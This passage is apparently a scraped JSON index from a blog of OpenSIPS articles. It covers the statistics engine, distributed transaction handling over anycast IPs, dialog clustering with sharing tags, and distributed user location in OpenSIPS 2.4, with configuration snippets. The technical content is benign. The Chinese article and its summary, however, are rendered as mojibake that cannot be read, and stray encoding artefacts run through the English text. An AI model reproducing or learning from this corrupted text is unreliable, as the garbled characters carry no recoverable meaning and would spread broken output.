update_stat(\u0026#34;packet:total_size\u0026#34;, \u0026#34;$ml\u0026#34;) } # å®šæ—¶å™¨è·¯ç”±ï¼Œå®šæ—¶é€šè¿‡HTTPå‘è¯·æ±‚ timer_route [daily_stat_push, 86400] { $json(all_stats) := \u0026#34;{\\\u0026#34;method\\\u0026#34;: {}, \\\u0026#34;packet\\\u0026#34;: {}}\u0026#34;; # pack and clear all method-related statistics stat_iter_init(\u0026#34;method\u0026#34;, \u0026#34;iter\u0026#34;); while (stat_iter_next(\u0026#34;$var(key)\u0026#34;, \u0026#34;$var(val)\u0026#34;, \u0026#34;iter\u0026#34;)) { $json(all_stats/method/$var(key)) = $var(val); reset_stat(\u0026#34;$var(key)\u0026#34;); } # pack and clear all packet-related statistics stat_iter_init(\u0026#34;packet\u0026#34;, \u0026#34;iter\u0026#34;); while (stat_iter_next(\u0026#34;$var(key)\u0026#34;, \u0026#34;$var(val)\u0026#34;, \u0026#34;iter\u0026#34;)) { $json(all_stats/packet/$var(key)) = $var(val); reset_stat(\u0026#34;$var(key)\u0026#34;); } # push the data to our web server if (!rest_post(\u0026#34;https://WEB_SERVER\u0026#34;, \u0026#34;$json(all_stats)\u0026#34;, , \u0026#34;$var(out_body)\u0026#34;, , \u0026#34;$var(status)\u0026#34;)) xlog(\u0026#34;ERROR: during HTTP POST, $json(all_stats)\\n\u0026#34;); if ($var(status) != 200) xlog(\u0026#34;ERROR: web server returned $var(status), $json(all_stats)\\n\u0026#34;); } ","permalink":"https://wdd.js.org/opensips/blog/deepin-stat-engine/","summary":"æ— è®ºä½ æ˜¯ç»éªŒä¸°å¯Œçš„OpenSIPSç®¡ç†å‘˜ï¼Œæˆ–è€…ä½ ä»…ä»…æƒ³æ‰¾åˆ°ä¸ºä»€ä¹ˆACKæ¶ˆæ¯åœ¨ä½ çš„ç½‘ç»œä¸­å¾ªç¯å‘é€ï¼Œå”¯ä¸€å¯ä»¥ç¡®å®šçš„æ˜¯ï¼šæˆ‘ä»¬æˆ–æ—©æˆ–æ™šä¼šéœ€è¦OpenSIPSæä¾›æ•°æ®æ¥å›ç­”ä»¥ä¸‹é—®é¢˜\nOpenSIPSè¿è¡Œäº†å¤šä¹…ï¼Ÿ æˆ‘ä»¬æ˜¯å¦è¢«æ¶æ„æµé‡æ”»å‡»äº†ï¼Ÿ æˆ‘ä»¬çš„å¹³å°å¤„ç†äº†å¤šå°‘ä¸ªæ¥è‡ªè¿è¥å•†çš„æ— æ•ˆSIPåŒ… åœ¨æµé‡å³°å€¼æ—¶ï¼ŒOpenSIPSæ˜¯å¦æ‹¥æœ‰è¶³å¤Ÿçš„å†…å­˜æ¥æ”¯æ’‘è¿è¡Œ \u0026hellip; å¹¸è¿çš„æ˜¯ï¼ŒOpenSIPSæä¾›å†…ç½®çš„ç»Ÿè®¡æ”¯æŒï¼Œæ¥æ–¹ä¾¿æˆ‘ä»¬å¿«é€Ÿè§£å†³ä»¥ä¸Šé—®é¢˜ã€‚è¯¦æƒ…å¯ä»¥æŸ¥çœ‹OpenSIPSç»Ÿè®¡æ¥å£ã€‚åœ¨æœ¬ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†ä¼šäº†è§£ç»Ÿè®¡å¼•æ“ï¼Œä½†æ˜¯ï¼Œä»€ä¹ˆæ˜¯å¼•æ“ï¼Ÿ\nç»Ÿè®¡å¼•æ“ æ€»çš„æ¥è¯´ï¼Œä¸‹å›¾å°±æ˜¯OpenSIPSå¼•æ“çš„æ ·å­ã€‚\nç»Ÿè®¡å¼•æ“å†…ç½®äºOpenSIPSã€‚å®ƒç®¡ç†æ‰€æœ‰çš„ç»Ÿè®¡æ•°æ®ï¼Œå¹¶ä¸”æš´éœ²ä¸€ä¸ªæ ‡å‡†çš„CRUDæ“ä½œæ¥å£ç»™æ‰€æœ‰çš„æ¨¡å—ï¼Œè®©æ¨¡å—å¯ä»¥æ¨é€æˆ–è€…ç®¡ç†ä»–ä»¬è‡ªå·±çš„ç»Ÿè®¡æ•°æ®ã€‚\nä¸€ä¸‹æœ‰ä¸‰ç§æ–¹å¼æ¥å’Œç»Ÿè®¡å¼•æ“è¿›è¡Œäº¤äº’\nç›´æ¥é€šè¿‡è„šæœ¬è®¿é—®ã€‚å¦‚é€šè¿‡$script(my-stat)å˜é‡ ä½¿ç”¨HTTPè¯·æ±‚æ¥è®¿é—® ä½¿ç”¨opensipsctl fifoå‘½ä»¤ ç»Ÿè®¡å¼•æ“æ˜¯éå¸¸çµæ´»å¹¶ä¸”å¯ä»¥é€šè¿‡ä¸åŒæ–¹å¼ä¸å…¶äº¤äº’ï¼Œé‚£ä¹ˆå®ƒæ€ä¹ˆèƒ½è®©æˆ‘ä»¬çš„ä½¿ç”¨å˜å¾—æ–¹ä¾¿å‘¢ï¼Ÿä¸‹é¢çš„ä¸€äº›å»ºè®®ï¼Œèƒ½å¤Ÿè®©ä½ å…¨é¢çš„å‘æŒ¥é™æ€ç»Ÿè®¡å¼•æ“çš„èƒ½åŠ›ï¼Œæ¥å¢å¼ºæŸäº›é‡è¦çš„å±‚é¢ã€‚\nç³»ç»Ÿå¼€å‘ç»´æŠ¤ å½“ä½ å¤„ç†OpenSIPSçš„DevOpsæ—¶ï¼Œä½ ç»å¸¸éœ€è¦ç›‘æ§OpenSIPSçš„ä¸€äº›è¿è¡Œå‚æ•°ã€‚ä½ çš„å…³æ³¨ç‚¹ä¸åŒï¼Œé‚£ä¹ˆä½ å°±éœ€è¦ç›‘æ§ä¸åŒçš„æ–¹é¢ï¼Œä¾‹å¦‚SIPäº‹åŠ¡ã€å¯¹è¯ã€å†…å­˜ä½¿ç”¨ã€ç³»ç»Ÿè´Ÿè½½ç­‰ç­‰\nä¸‹é¢æ˜¯OpenSIPSç»Ÿè®¡åˆ†ç»„çš„ä¸€ä¸ªæ¦‚è¦ï¼Œä»¥åŠç»„å†…çš„æ¯ä¸€ä¸ªç»Ÿè®¡å€¼ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒwikiã€‚\nç»Ÿè®¡ç®€ä»‹ å‡å¦‚æˆ‘ä»¬æƒ³é€šè¿‡sippå¯¹æˆ‘ä»¬çš„å¹³å°è¿›è¡Œæµé‡æµ‹è¯•ï¼Œæˆ‘ä»¬æƒ³å‹æµ‹æœŸé—´è§‚æµ‹å½“å‰çš„äº‹åŠ¡ã€å¯¹è¯ã€å…±äº«å†…å­˜çš„å€¼å˜åŒ–ã€‚æˆ–è€…æˆ‘ä»¬æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªæ–°çš„SIPæä¾›å•†ï¼Œä»–ä»¬æ¯å¤©æ—©ä¸Š9ç‚¹ä¼šå¼€å§‹å‘æˆ‘ä»¬å¹³å°æ¨é€æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦ç›‘æ§ä»–ä»¬çš„æ¨é€ä¼šå¯¹æˆ‘ä»¬ç³»ç»Ÿäº§ç”Ÿçš„å½±å“ã€‚\nä½ å¯ä»¥åœ¨OpenSIPSå®ä¾‹ä¸­è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š\nwatch -n0.2 \u0026#39;opensipsctl fifo get_statistics inuse_transactions dialog: shmem:\u0026#39; æ³¨æ„ get_statisticså‘½ä»¤å³å¯ä»¥æ¥å—ä¸€ä¸ªç»Ÿè®¡å€¼é¡¹ï¼Œä¹Ÿå¯ä»¥æ¥å—ä¸€ä¸ªç»Ÿè®¡ç»„çš„é¡¹ã€‚ç»Ÿè®¡ç»„éƒ½æ˜¯ä»¥å†’å·(:)ç»“å°¾ã€‚\nä¸é€’å¢çš„ç»Ÿè®¡æŒ‡æ ‡è¿›è¡Œäº¤äº’ ç»Ÿè®¡æŒ‡æ ‡çœ‹èµ·æ¥ç›¸åŒï¼Œå®é™…ä¸Šåˆ†ä¸ºä¸¤ç±»\nç´¯è®¡å€¼ã€‚ç´¯è®¡æ˜¯ä¸€èˆ¬æ˜¯éšç€æ—¶é—´å¢é•¿ï¼Œä¾‹å¦‚rcv_requests, processed_dialogsï¼Œè¡¨ç¤ºä»æŸä¸ªæ—¶é—´ç‚¹å¼€å§‹ç´¯è®¡æ”¶åˆ°æˆ–è€…å¤„ç†äº†å¤šå°‘ä¸ªä»»åŠ¡ è®¡ç®—å€¼ã€‚è®¡ç®—å€¼ä¸€èˆ¬å’Œç³»ç»Ÿè¿è¡Œè´Ÿè½½æœ‰å…³ï¼Œå’Œæ—¶é—´æ— å…³ã€‚ä¾‹å¦‚active_dialogs, real_used_size, è¿™äº›å€¼éƒ½æ˜¯ç”±å†…éƒ¨å‡½æ•°è®¡ç®—å‡ºæ¥çš„è®¡ç®—å€¼ ä¸€èˆ¬æ¥è¯´ï¼Œè„šæœ¬ä¸­å®šä¹‰çš„ç»Ÿè®¡å€¼éƒ½æ˜¯é€’å¢çš„ï¼ŒOpenSIPSæ— æ³•é‡æ–°è®¡ç®—å®ƒï¼Œåªèƒ½æˆ‘ä»¬è‡ªå·±æ¥è®¡ç®—æˆ–è€…ç»´æŠ¤å®ƒçš„å€¼ã€‚\nä»¥ä¸‹æ–¹å¼å¯ä»¥å¿«é€ŸæŸ¥çœ‹è®¡ç®—å€¼ç±»çš„ç»Ÿè®¡é¡¹\nopensipsctl fifo list_statistics æŸäº›åœºæ™¯ï¼Œä½ å¯èƒ½éœ€è¦å‘¨æœŸæ€§çš„é‡ç½®ç´¯è®¡å€¼ç±»çš„ç»Ÿè®¡é¡¹ã€‚ä¾‹å¦‚ä½ å¯ä»¥åªéœ€è¦ç»Ÿè®¡å½“å¤©çš„processed_dialogsï¼Œdaily_routed_minutesï¼Œé‚£ä¹ˆä½ åªéœ€è¦è®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæ¯å¤©0ç‚¹ï¼Œé‡ç½®è¿™äº›ç»Ÿè®¡å€¼ã€‚\nopensipsctl fifo reset_statistics processed_dialogs åœ¨è„šæœ¬ä¸­è‡ªå®šä¹‰ç»Ÿè®¡é¡¹ åœ¨è„šæœ¬ä¸­è‡ªå®šä¹‰ç»Ÿè®¡é¡¹æ˜¯éå¸¸ç®€å•çš„ï¼Œåªéœ€è¦åšä¸¤æ­¥\nåŠ è½½statistics.soæ¨¡å— åœ¨æŸäº›ä½ç½®è°ƒç”¨å‡½æ•°, update_stat(\u0026quot;daily_routed_minutes\u0026quot;, \u0026quot;+1\u0026quot;) å®æˆ˜ï¼šè„šæœ¬ä¸­æœ‰è®¸å¤šçš„è‡ªå®šä¹‰ç»Ÿè®¡é¡¹ ç»Ÿè®¡æ¯å¤©æ”¶åˆ°çš„SIPæ¶ˆæ¯çš„è¯·æ±‚æ–¹å¼, ä»¥åŠå¤„ç†çš„æ¶ˆæ¯é•¿åº¦ æ¯éš”24å°æ—¶ï¼Œä»¥JSONçš„å½¢å¼ï¼Œå°†æ¶ˆæ¯å†™åˆ°SIPæœåŠ¡å™¨ # è®¾ç½®ç»Ÿè®¡ç»„ modparam(\u0026#34;statistics\u0026#34;, \u0026#34;stat_groups\u0026#34;, \u0026#34;method, packet\u0026#34;) # è¯·æ±‚è·¯ç”± route { ... update_stat(\u0026#34;method:$rm\u0026#34;, \u0026#34;+1\u0026#34;); update_stat(\u0026#34;packet:count\u0026#34;, \u0026#34;+1\u0026#34;); update_stat(\u0026#34;packet:total_size\u0026#34;, \u0026#34;$ml\u0026#34;) # message length .","title":"æ·±å…¥OpenSIPSç»Ÿè®¡å¼•æ“"},{"content":"he advantages of doing Load Balancing and High AvailabilityÂ **withoutÂ **any particular requirements from the clients side are starting to make Anycast IPs more and more appealing in the VoIP world. But are you actually using the best out of it? This article describes how you can use OpenSIPS 2.4 to make the best use of an anycast environment.AnycastÂ is a UDP-based special network setup where a single IP is assigned to multiple nodes, each of them being able to actively use it (as opposed to a VRRP setup, where only one instance can use the IP). When a packet reaches the network with an anycast destination, the router sends it to the â€œclosestâ€ node, based on different metrics (application status, network latency, etc). This behavior ensures that traffic is (1)Â balancedÂ by sending it to one of the least busy nodes (based on application status) and also ensures (2)Â geo-distribution, by sending the request to the closest node (based on latency). Moreover, if a node goes down, it will be completely put out of route, ensuring (3)Â high availabilityÂ for your platform. All these features without any special requirements from your customers, all they need is to send traffic to the anycast IP.Sounds wonderful, right? It really is! And if you are running using anycast IPs in a transaction stateless mode, things just work out of the box.\nState of the art A common Anycast setup is to assign the anycast IPs to the nodes at the edge of yourÂ platform, facing the clients. This setup ensures that all three features (load balancing, geo-distribution and high-availability) are provided for your customersâ€™ inbound calls. However, most of the anycast â€œstoriesâ€ we have heard or read about are only using the anycast IP for the initial incoming INVITEs from customers. Once received, the entire call is pinned to a unicast IP of the first server that received the INVITE. Therefore all sequential messages will go through that single unicast IP. Although this works fine from SIP point of view, you will lose all the anycast advantages such as high-availability.When using this approach (of only receiving initial request on the anycast IP) the inbound calls to the clients will also be affected, because besides losing dialog high-availability, you will also need to ask all your clients to accept calls from all your available unicast IPs. Imagine what happens when you add a new node.Our full anycast solution aims to sort out these limitations by always keeping the anycast IPs in the route for the entire call. This means that your clients will always have one single IP to provision, the anycast IP. And when a node goes down, all sequential messages will be re-routed (by the router) to the next available node. Of course, this node needs to have the entire call information to be able to properly close the call, but that can be easily done in OpenSIPS usingÂ dialog replication.Besides the previous issue, most of the time running in stateless mode is not possible due to application logic constraints (re-transmission handling, upstream timeout detection, etc.). Thus stateful transaction mode is required, which complicates a bit more our anycast scenario.\nAnycast in a transaction stateful scenario A SIP transaction consists of a request and all the replies associated to that request. According to theÂ SIP RFC, when a stateful SIP proxy sends a request, the next hop should immediately send a reply as soon as it received the request. Otherwise, the SIP proxy will start re-transmitting that request until it either receives a reply, or will eventually time out. Now, letâ€™s consider the anycast scenario described inÂ Figure 1: Figure 1.OpenSIPS instance 1 sends an INVITE to the client, originated from the Anycast IP interface. The INVITE goes through the Router, and reaches the Clientâ€™s IP. However, when the Client replies with 200 OK, the Router decides the â€œshortestâ€ path is to OpenSIPS instance 2, which has no information about the transaction. Therefore, instance 2 drops all the replies. Moreover, since instance 1 did not receive any reply, it will start re-transmitting the INVITE. And so on, and so forth, until instance 1 times out, because it did not receive any reply, and the Client times out because there was no ACK received for its replies. Therefore the call is unable to complete.To overcome this behavior, we have developed a new mechanism that is able to handle transactions in such distributed environments. The following section describes how this is done.\nDistributed transactions handling Transactions are probably the most complicated structures in SIP, especially because they are very dynamic (requests and replies are exchanged within milliseconds) and they contain a lot of data (various information from the SIP messages, requests for re-transmissions, received replies, multiple branches, etc). That makes them very hard to move around between different instances. Therefore, instead of sending transaction information to each node within the anycast â€œclusterâ€, our approach was to bring the events to the node that created the transaction. This way we minimize the amount of data exchanged between instances â€“ instead of sending huge transaction data, we simply replicate one single message â€“Â and we are only doing this when itâ€™s really necessary â€“ we are only replicating messages when the router that manages the anycast config switches to a different node.When doing distributed transaction handling, the logic of theÂ transaction moduleÂ is the following: when a reply comes on one server, we check whether the current node has a transaction for that reply. If it does (i.e. the router did not switch the path), the reply is processed locally. If it does not, then somebody else must â€œownâ€ that transaction. The question is who? Thatâ€™s where the SIP magic comes: when we generate the INVITE request towards the client, we add a special parameter in the VIA header, indicating the ID of the node that created the transaction. When the reply comes back, that ID contains exactly the node that â€œownsâ€ the transaction. Therefore, all we have to do is to take that ID and forward the message to it, using theÂ proto_bin module. When the â€œownerâ€ receives the reply, it â€œseesâ€ it exactly as it would have received it directly from the client, thus treating it exactly as any other regular reply. And the call is properly established further. Figure 2.There is one more scenario that needs to be taken into account, namely what happens when a CANCEL message reaches a different node (Figure 2). Since there is no transaction found on node 2, normally that message would have been declined. However, in an anycast environment, the transaction might be â€œownedâ€ by a different node. , therefore, we need to instruct him that the transaction was canceled. However, this time we have no information about who â€œownsâ€ that transaction â€“ so all we can do is to broadcast the CANCEL event to all the nodes within the cluster. If any of the nodes that receive the event find the transaction that the CANCEL refers to, it will properly reply a 200 OK message and then close all the ongoing branches. If no transaction is found on any node, the CANCEL will eventually time out on the Client side.A similar approach is done for a hop-by-hop ACK message received in an anycast interface.\nAnycast Configuration The first thing we have to do is to configure the anycast address on each node that uses it. This is done in theÂ listenÂ parameter:\nlisten = udp:10.10.10.10:5060 anycast The distributed transaction handling feature relies on theÂ clusterer moduleÂ to group the nodes that use the same anycast address in a cluster. The resulting cluster id has to be provisioned using theÂ tm_replication_clusterÂ parameter of the transaction module:\nloadmodule \u0026#34;tm.so\u0026#34; modparam(\u0026#34;tm\u0026#34;, \u0026#34;tm_replication_cluster\u0026#34;, 1) The last thing that we need to take care of is the hop-by-hop messages, such as ACK. This is automatically done by using the t_anycast_replicate() function: if (!loose_route()) { if (is_method(\u0026#34;ACK\u0026#34;) \u0026amp;\u0026amp; !t_check_trans()) { # transanction not here - replicate msg to other nodes t_anycast_replicate(); exit; } } Notice that the CANCEL is not treated in the snippet above. That is because CANCEL messages received on an anycast interface are automatically handled by the transaction layer as described in the previous section. However, if one intends to explicitly receive the CANCEL message in the script to make any adjustments (i.e. change the message Reason), they can disable the default behavior using the cluster_auto_cancel param. However, this changes the previous logic a bit, since the CANCEL must be replicated as well in case no transaction is locally found:\nmodparam(\u0026#34;tm\u0026#34;, \u0026#34;cluster_auto_cancel\u0026#34;, no) ... if (!loose_route()) { if (!t_check_trans()) { if (is_method(\u0026#34;CANCEL\u0026#34;)) { # do your adjustments here t_anycast_replicate(); exit; } else if is_method(\u0026#34;ACK\u0026#34;) { t_anycast_replicate(); exit; } } } And thatâ€™s it â€“ you have a fully working anycast environment, with distributed transaction matching!\nFind out more! The distributed transaction handling mechanism has already been released on the OpenSIPS 2.4 development branch. To find out more about the design and internals of this feature, as well as other use cases, make sure you do not miss theÂ Full Anycast support at the edge of your platform using OpenSIPS 2.4Â presentation about this at theÂ Amsterdam 2018 OpenSIPS Summit, May 1-4!\n","permalink":"https://wdd.js.org/opensips/blog/full-anycast/","summary":"he advantages of doing Load Balancing and High AvailabilityÂ **withoutÂ **any particular requirements from the clients side are starting to make Anycast IPs more and more appealing in the VoIP world. But are you actually using the best out of it? This article describes how you can use OpenSIPS 2.4 to make the best use of an anycast environment.AnycastÂ is a UDP-based special network setup where a single IP is assigned to multiple nodes, each of them being able to actively use it (as opposed to a VRRP setup, where only one instance can use the IP).","title":"Full Anycast support in OpenSIPS 2.4"},{"content":"Dialog replication in OpenSIPS has been around since version 1.10, when it became clear that sharing real-time data through a database is no longer feasible in a large VoIP platform. Further steps in this direction have been made in 2.2, with the advent of theÂ clustererÂ module, which manages OpenSIPS instances and their inter-communication.Â But have we been able to achieve the objective of a true and complete solution forÂ clusteringÂ dialog support? In this article we are going to look into the limitations of distributing ongoing calls in previous OpenSIPS versions and how we overcame them and added new possibilities in 2.4, based on theÂ improved clustering engine.\nPrevious Limitations Up until this point, distributing ongoing dialogs essentially only consisted in sharing the relevant internal information with all other OpenSIPS instances in the cluster. To optimize the communication, whenever a new dialog is created (and confirmed) or on existing one is updated (state changes etc.), a binary message about that particular dialog is broadcasted.Limiting the data exchange to be driven by runtime events leaves an instance with no way of learning all the dialog information from the cluster when it boots up or at a particular moment in time. Consider what happens when we restart a backup OpenSIPS: any failover that we hope to be able to handle on that node will have to be delayed until it gets naturally in sync with the other node(s).But the more painful repercussion of just sharing data without any other distributed logic is the lack of a mechanism to coordinate certain data-related actions between the cluster nodes. For example, in a typical High-Availability setup with an active-passive nodes configuration, although all dialogs are duplicated to the passive node, the following must be performed exactly once:\ngenerateÂ **BYE requestsÂ **and/or produceÂ CDRs (Call Detail Records) upon dialog expiration; send Re-Invite or OPTIONSÂ pingsÂ to end-points; send replication packets on dialog events; update the dialog database (if it is still used as a failsafe for binary replication, e.g. both nodes crash). Usage scenarios Before actually diving into how OpenSIPS 2.4 solves the before mentioned issues, letâ€™s first see the most popular scenarios we considered when designing the dialog clustering support:\nActive â€“ BackupÂ setup for High Availability using Virtual IPs**.**Â The idea here would be to have a Virtual IP (or floating IP) facing the end-users. This IP will be automatically moved from a failed instance to a hot-backup server by tools likeÂ vrrpd, KeepaliveD, Heartbeat. Active â€“ ActiveÂ setup, or a double cross Active-Backup. This is a more â€œcreativeâ€ approach using two Virtual IPs, each server being active for one of them and backup for the other, and still sharing all the dialogs, in order to handle both VIPs when a server fails. AnycastÂ setup for Distributed calls (High Availability and Balancing). This relies on the newly add full support for Anycast**Â **introduced in OpenSIPS 2.4. You can find more details in theÂ dedicated article. Dialog Clustering with OpenSIPS 2.4 The new dialog clustering support in OpenSIPS 2.4 is addressing all the mentioned limitations by properly and fully addressing the typical clustering scenarios. But first letâ€™s see which are the newly introduced concepts in OpenSIPS 2.4 when it comes to clustering dialogs.\nData synchronization In order to address our first discussed issue, the improved clustering under-layer in OpenSIPS 2.4 offers the capability of synchronizing a freshly booted node with the complete data set from the cluster in a fast and transparent manner. This way, we can minimize the impact of restarting an OpenSIPS instance, or plugging a new node in the cluster on the fly, without needing any DB storage or having to accept the compromise of lost dialogs. We can also perform a sync at any time via an MI command, if for some reason the dialog data got desynchronized on a given instance.\nDialog ownership mechanism The other big improvement that OpenSIPS 2.4 introduces for distributing dialogs is the capability to precisely decide which node in the cluster is responsible for a dialog â€“ responsible in the way of triggering certain actions for that dialog. This comes as a necessity because some of the dialogs are locally created on an instance, some are temporarily handled in place of a failed/inactive node and others are just kept as backup.Â As such, the concept of dialog â€œownershipâ€ was introduced.The basic idea of this mechanism is that a single node in the dialog cluster (where all the calls are shared) is â€œresponsibleâ€ at any time of a given dialog, in terms of taking actions for it. When the node owning the dialog goes down, another node become its owner and handle its actions.But how is this ownership concept concretely implemented in OpenSIPS 2.4?\nSharing tags In order to be able to establish an ownership relationship between the nodes and the dialog, we introduced the concept of tags orÂ _â€œsharingÂ tagsâ€Â _as we call them. Each dialog is marked with a single tag; on the other hand, a node is actively responsible for (owning) a tag (and indirectly all the dialogs marked with that tag). A tag may be present on several nodes, but only a single node sees the tag asÂ active; the other nodes aware of that tag are seeing the tag inÂ standby/backupÂ mode.So each node may be aware of multiple sharing tags, each with anÂ _activeÂ _orÂ backupÂ state. Each tag can be defined with an implicit state at OpenSIPS startup or directly set at runtime and all this information is shared between the cluster nodes. When we set a sharing tag to active on certain node, we are practically setting that node to become the owner of all its known dialogs that are marked with that particular tag. At the same time, if another node was active for tag, it has to step down.To better understand this, we will briefly describe how the sharing tags should be used in the previously mentioned scenarios, considering a simple two node cluster:\nin an active-backup cluster with a single VIP,Â we would only need a single sharing tag corresponding the VIP address; the node that holds the VIP will also have the VIP set to active and perform all the dialog related actions; in an active-active cluster with two VIPs, we would need two sharing tags, corresponding to each VIP, and whichever node holds the given VIP, should have the appropriate tag set asÂ active; in an anycast cluster setup, we will have one sharing tag corresponding to each node (because the dialog is tied to the node it was first created as opposed to an IP). If a node is up, it should have its corresponding tagÂ active, otherwise any node can take the tag over. Configuration Setting up dialog replication in OpenSIPS 2.4 is very easy and, in the following, we will exemplify our discussed scenarios with the essential configuration:\n1. Active-backup setup Letâ€™s use the tag named â€œvipâ€ which will be configured via theÂ dlg_sharing_tagÂ module parameter. When starting OpenSIPS, you need to check the HA status of the node (by inspecting the HA system) and to decide which node will start as owner of the tag:modparam(\u0026ldquo;dialog\u0026rdquo;, \u0026ldquo;dlg_sharing_tag\u0026rdquo;, \u0026ldquo;vip=active\u0026rdquo;)if active or :modparam(\u0026ldquo;dialog\u0026rdquo;, \u0026ldquo;dlg_sharing_tag\u0026rdquo;, \u0026ldquo;vip=backup\u0026rdquo;)if standby.During runtime, depending on the change of the HA system, the tag may be moved (as active) to a different node by using MI commands (see following chapter).At script level, all we need to do, on each node, is to mark a newly created dialog with the sharing tag, using theÂ set_dlg_sharing_tag()Â function:if (is_method(\u0026ldquo;INVITE\u0026rdquo;)) {Â create_dialog();Â set_dlg_sharing_tag(\u0026ldquo;vip\u0026rdquo;);}\n2. Active-active setup Similar with the previous case, but we will use two tags, one for each VIP address.Â We will define the initial tag state for the first VIP, on the first node:modparam(\u0026ldquo;dialog\u0026rdquo;, \u0026ldquo;dlg_sharing_tag\u0026rdquo;, \u0026ldquo;vip1=active\u0026rdquo;)The second node willÂ initially be responsible for the second VIP, so on node id 2 we will set:modparam(\u0026ldquo;dialog\u0026rdquo;, \u0026ldquo;dlg_sharing_tag\u0026rdquo;, \u0026ldquo;vip2=active\u0026rdquo;)Now, on each node, depending on which VIP do we receive the initial Invite, we mark the dialog appropriately:if (is_method(\u0026ldquo;INVITE\u0026rdquo;)) {Â create_dialog();Â if ($Ri == 10.0.0.1 # VIP 1)Â set_dlg_sharing_tag(\u0026ldquo;vip1\u0026rdquo;);Â else if ($Ri == 10.0.0.2 # VIP 2)Â set_dlg_sharing_tag(\u0026ldquo;vip2\u0026rdquo;);}So, calls established via the VIP1 address will be marked with the â€œvip1â€ tag and handled by the node having the â€œvip1â€ tag as active â€“ this will be the node 1 in normal operation.The calls established via the VIP2 address will be marked with the â€œvip2â€ tag and handled by the node having the â€œvip2â€ tag as active â€“ this will be the node 2 in normal operation.If the node 1 fails, the HA system will move the VIP1 as active on node 2. Further, the HA system is responsible to instruct OpenSIPS running on node 2 that it become the owner of tag â€œvip1â€ also, so node 2 will start to actively handle the calls marked with â€œvip1â€ also.\n3. Anycast setup Each node has its own corresponding tag and it starts with the tag as active. So on node 1 we will have:modparam(\u0026ldquo;dialog\u0026rdquo;, \u0026ldquo;dlg_sharing_tag\u0026rdquo;, \u0026ldquo;node_1=active\u0026rdquo;)And on the second node, the same as above, but withÂ â€œnode_2=activeâ€.Now, each node marks the dialogs with its own tag, for example on node 1:if (is_method(\u0026ldquo;INVITE\u0026rdquo;)) {Â create_dialog();Â set_dlg_sharing_tag(\u0026ldquo;node_1\u0026rdquo;);}And,Â conversely, node 2 marks each created dialog with theÂ â€œnode_2â€Â tag.If node 1 fails, the monitoring system (also responsible for the Anycast management and BGP updates) will pick one of the remaining node in the anycast group and it will activate the â€œnode_1â€ tag on it. So, this new node will became owner and responsible for the calls created on former node 1.\nChanging sharing tags state All that remains to be discussed is how can we take over the ownership of the dialogs flagged with a certain sharing tag at runtime. This is of course the case whenÂ our chosen mechanism of node availability detects that a node in the cluster is down, or when weÂ do a manual switch-over (e.g. for maintenance). So for this purpose, all we have to do is to issue the MI commandÂ dlg_set_sharing_tag_activeÂ that sets a certain sharing tag to the active state. For example, in the single VIP scenario, with a sharing tag namedÂ â€œvipâ€,Â after we have re-pointed the floating IP to the current machine, we would run:opensipsctl fifo dlg_set_sharing_tag_active vip\nConclusions The new dialog clustering support in OpenSIPS 2.4 is a complete one as it not only takes care of dialog replication/sharing, but also of dialog handling in terms of properly triggering dialog-specific actions.The implementation also tries to provide a consistent solution, by following and addressing the most used scenarios in terms of dialog clustering â€“ these are real world scenarios answering to real world needs.Even more, the work on the dialog clustering was consistently correlated with work on the Anycast support, so it will be an easy task for the user to build an integrated anycast setup taking care of both transaction and dialog layers.Need more practical examples ? Join us to theÂ OpenSIPS Summit 2018Â in Amsterdam and see the Interactive Demos about the clustering support in OpenSIPS 2.4\n","permalink":"https://wdd.js.org/opensips/blog/cluster-call/","summary":"Dialog replication in OpenSIPS has been around since version 1.10, when it became clear that sharing real-time data through a database is no longer feasible in a large VoIP platform. Further steps in this direction have been made in 2.2, with the advent of theÂ clustererÂ module, which manages OpenSIPS instances and their inter-communication.Â But have we been able to achieve the objective of a true and complete solution forÂ clusteringÂ dialog support?","title":"Clustering ongoing calls with OpenSIPS 2.4"},{"content":"The distributed SIP user location support is one of the major features of theÂ latest stable OpenSIPS release, namely 2.4.Â The aim of this extension of the OpenSIPSÂ usrlocÂ module is to provide a horizontally scalable solution that is easy to set up and maintain, while remaining flexible enough to cope with varying needs of each specific deployment.Throughout this text, by â€œdataâ€ we refer to SIP Addresses-of-Record (subscribers) and their dynamic SIP Contact bindings (network coordinates of their SIP devices) â€” all of these must be replicated across cluster nodes.Â From a data sharing point of view, we can break the distributed user location support down in two major modes of usage:\nâ€œfederationâ€, where each node holds a portion of the overall dataset.Â You can read everything about this data sharing strategyÂ in this tutorial. â€œfull sharingâ€, where all cluster nodes are homogeneous and interchangeable. In this article, weâ€™re going to zoom in on theÂ â€œfull sharingâ€Â support, which is actually further broken down into two submodes of usage, depending on the size of your deployment: one where the dataset fits into OpenSIPS memory, and the other one where it is fully managed by a specialized NoSQL database.\nNative â€œFull Sharingâ€ With native (OpenSIPS-only) data sharing, we make use of the clustering layer in order to replicate SIP AoRs and Contacts between nodes at runtime, as well as during the startup synchronization phase.Â An example setup would look like the following:\nNative â€œFull Sharingâ€ ArchitectureNotice how the OpenSIPS cluster isÂ front-endedÂ by an additional SIP entity: aÂ Session Border Controller.Â This is an essential requirement of this topology (and a commonÂ gotcha!).Â The idea is that the nodes, along with the way they use the data must be identical.Â This allows, for example, the ability to ramp up/down the number of instances when the platform is running at peak hour or is sitting idle.Letâ€™s take a look at some common platform management concerns and see how they are dealt with using the native â€œfull sharingâ€ topology.\nDealing with Node Failures Node failures in â€œfull sharingâ€ topologies are handled smoothly.Â Thanks to the SBC front-end that alleviates all IP restrictions, the service can withstand downtime from one or more cluster nodes without actually impacting the clients at all.\nSuccessfully completing a call through Node 2 after Node 1 goes offlineIn this diagram, cluster Node 1 goes offline due to a hardware failure.Â After the SIP INVITE transaction towards Node 1 times out, the SBC fails over to Node 2, successfully completing the call.\nRestart Persistency By having restart persistency, we ensure that we are able to restart a node without losing the cached dataset.Â The are two ways of achieving this, depending on whether you intend to use an SQL database or not.\nCluster Sync The clustering layer can also act as anÂ initialization tool, allowing a newly booted â€œjoinerâ€ node to discover a consistent â€œdonorâ€ node from which to request a full data sync.\nSQL-based Users who prefer a more sturdy, disk-driven way of persisting data can easily configure an SQL database URL to which an OpenSIPS node will periodically flush its cached user location 